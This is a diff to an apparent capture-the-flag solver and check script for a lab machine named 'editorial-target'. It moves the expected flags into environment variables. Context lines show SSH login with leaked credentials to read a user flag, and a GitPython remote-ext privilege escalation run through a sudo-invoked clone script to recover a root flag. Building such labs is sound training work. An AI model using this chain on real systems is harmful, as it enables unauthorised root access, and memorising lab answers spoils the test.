@@ -9,8 +9,10 @@ import urllib.error
 import urllib.parse
 import urllib.request
 
-HOST = "editorial-target"
+HOST = os.environ.get("TARGET_HOST", "editorial-target")
 BASE = "http://" + HOST
+EXPECTED_USER_FLAG = os.environ["EXPECTED_USER_FLAG"]
+EXPECTED_ROOT_FLAG = os.environ["EXPECTED_ROOT_FLAG"]
 
 def get(path):
     with urllib.request.urlopen(BASE + path, timeout=6) as res:
@@ -75,7 +77,7 @@ ssh_result = subprocess.run([
     "id -un; cat /home/dev/user.txt; git -C /home/dev/apps rev-list --count HEAD",
 ], capture_output=True, text=True, env=env, timeout=15)
 assert ssh_result.returncode == 0, (ssh_result.stdout, ssh_result.stderr)
-assert ssh_result.stdout.splitlines() == ["dev", "TTP{ci_user_first_instance}", "2"], ssh_result.stdout
+assert ssh_result.stdout.splitlines() == ["dev", EXPECTED_USER_FLAG, "2"], ssh_result.stdout
 print("PASS: private API onboarding information authenticates to SSH and retrieves User flag", flush=True)
 
 # Continue as an outside player: the second account comes from an actual
@@ -125,5 +127,5 @@ for remote in (
         "sudo -n /usr/local/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py '" + remote + "'",
     )
 answer = ssh_as("prod", prod_credential.group(1), "cat /tmp/editorial-gitpython-root-answer")
-assert answer.returncode == 0 and answer.stdout.strip() == "TTP{ci_root_first_instance}", (answer.stdout, answer.stderr)
+assert answer.returncode == 0 and answer.stdout.strip() == EXPECTED_ROOT_FLAG, (answer.stdout, answer.stderr)
 print("PASS: real GitPython remote-ext privilege escalation recovers the private CI Root Flag", flush=True)
